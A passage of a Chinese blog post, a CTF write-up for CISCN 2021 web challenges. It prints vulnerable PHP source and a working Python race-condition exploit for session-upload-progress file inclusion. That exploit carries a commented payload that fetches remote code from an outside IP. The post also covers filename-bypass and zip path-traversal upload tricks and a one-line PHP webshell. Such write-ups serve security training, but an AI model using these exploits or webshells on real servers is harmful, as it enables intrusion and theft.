28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-middle_source" class="headings">web-middle_source</a></h2>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">&#34;your flag is in some file in /etc &#34;</span><span class="p">;</span>
+    <span class="nv">$fielf</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;field&#34;</span><span class="p">];</span>
+    <span class="nv">$cf</span><span class="o">=</span><span class="s2">&#34;/tmp/app_auth/cfile/&#34;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cf&#39;</span><span class="p">];</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$cf</span><span class="p">)){</span>
+        <span class="k">include</span> <span class="nv">$cf</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$$field</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err"> your flag is in some file in /etc 
+</span></code></pre></td></tr></table></div>
+</div>
+</div><p>扫目录扫到<code>/.listing</code>路由，访问得到文件信息</p>
+<pre><code>total 16 drwxr-xr-x 1 root root 4096 May 6 06:02 .
+drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
+-rw-r--r-- 1 root root 257 Apr 29 11:46 index.php
+-rw-r--r-- 1 root root 19 Apr 29 10:51 you_can_seeeeeeee_me.php
+</code></pre><p>通过<code>you_can_seeeeeeee_me.php</code>获得phpinfo信息，虽然没有<code>open_basedir</code>，但是ban掉了很多函数，常见的日志包含也用不了，使用<a href="https://anthem-whisper.github.io/p/wmctf2020/" target="_blank" rel="noopener">WMCTF2020</a>的session_upload_progress姿势实现文件包含</p>
+<p>exp(改自上述文章)</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="n">sessID</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.96.30:24381/&#39;</span>
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="c1"># data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php phpinfo();?&gt;&#39;}</span>
+        <span class="c1"># data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php echo(&#34;PWN!!!&#34;);copy(&#34;http://IP/x.txt&#34;,&#34;/tmp/pwn&#34;);?&gt;&#39;}</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php show_source(&#34;/etc/ibcdajejbd/fhccbdadhd/abeadaafbb/iddjieeddf/gihbgceded/fl444444g&#34;);?&gt;&#39;</span><span class="p">}</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">256</span> <span class="o">*</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessID</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;a.txt&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">)}</span>
+        <span class="p">)</span>
+<span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&#34;field&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;cf&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../../../../../../../../var/lib/php/sessions/ddfdafcded/sess_&#34;</span> <span class="o">+</span> <span class="n">sessID</span><span class="p">,</span>
+        <span class="p">}</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s1">&#39;CISCN&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*] trying&#34;</span><span class="p">)</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span>
+<span class="n">write</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">write</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">read</span><span class="p">()</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="web-upload"><a href="#web-upload" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-upload" class="headings">web-upload</a></h2>
+<p><code>index.php</code></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
+    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这么大个的东西你是想d我吗？&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;如果不能好好传图片的话就还是不要来打扰我了&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;东西不能方方正正的话就很讨厌&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有些东西让你传上去的话那可不得了&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;传都没有传上去&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><code>example.php</code></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
+    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
+    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;要不咱们再看看？&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;都不能解压呢&#34;</span><span class="p">);</span> 
+    <span class="p">}</span> 
+    
+    <span class="k">echo</span> <span class="s2">&#34;可以解压，我想想存哪里&#34;</span><span class="p">;</span>
+    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
+    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
+    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
+    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
+        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
+            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
+            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
+        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span> 
+</code></pre></td></tr></table></div>
+</div>
+</div><p>两个结合起来不难发现需要上传zip（php的Unicode绕过找不到），但是后缀中不能包含i，参考<a href="https://bugs.php.net/bug.php?id=70072" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=70072</a>发现可以使用<code>İ</code>绕过，图片尺寸通过以下payload绕过（位置可以不在头部）</p>
+<pre><code>#define height 1
+#define width 1
+</code></pre><p>然后上传，访问<code>example.php</code>利用目录穿越解压zip解压出php执行。前面都不是很麻烦，主要是后面的图片马内容修改，网上流传的<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>在php7.2加上<code>disable_function</code>后局限性有点大，很难找到可以使用的函数了。参考<a href="https://blog.csdn.net/miuzzx/article/details/116885083" target="_blank" rel="noopener">ciscn国赛初赛web（4道低分题）</a>改payload，然后将写入尺寸信息的txt文件一并压入压缩包绕过尺寸判断（抓包添加也可以，不过这时候Unicode字符会被解析为?，需要使用URL编码或改一下bp的字体），解压后直接连蚁剑翻<code>/etc</code></p>
+<h2 id="web-filterunsolved"><a href="#web-filterunsolved" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-filterunsolved" class="headings">web-filter|unsolved</a></h2>
+<blockquote>
+<p>hint:</p>
+<pre><code>据说这是配置文件里面的重要内容，或许对你有用！！
+  'log' =&gt; [
+      'traceLevel' =&gt; YII_DEBUG ? 0 : 0,
+      'targets' =&gt; [
+          [
+              'class' =&gt; 'yii\log\FileTarget',
+              'levels' =&gt; ['error'],
+              'logVars' =&gt; [],
+          ],
+      ],
+  ],
+</code></pre></blockquote>
+<p>等wp中。。。</p>
+<h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h2>
+<p><a href="https://blog.csdn.net/miuzzx/article/details/116885083" target="_blank" rel="noopener">ciscn国赛初赛web（4道低分题）</a></p>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://tyskill.github.io" class="p-author h-card" target="_blank" rel="noopener">tyskill</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/posts/ciscn2021/" target="_blank" rel="noopener">https://tyskill.github.io/posts/ciscn2021/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/posts/buuoj_21_1/" class="related-link">[BUUOJ]2021第一弹</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/hfctf2021/" class="related-link">虎符CTF2021writeup</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/unctf2020/" class="related-link">UNCTF2020记录+复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/hmb2021/" class="related-link">红帽杯2021</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/zhb1st/" class="related-link">[BUUOJ]纵横杯1st线下赛复现</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+    
+        <div class="post-tags">
+            
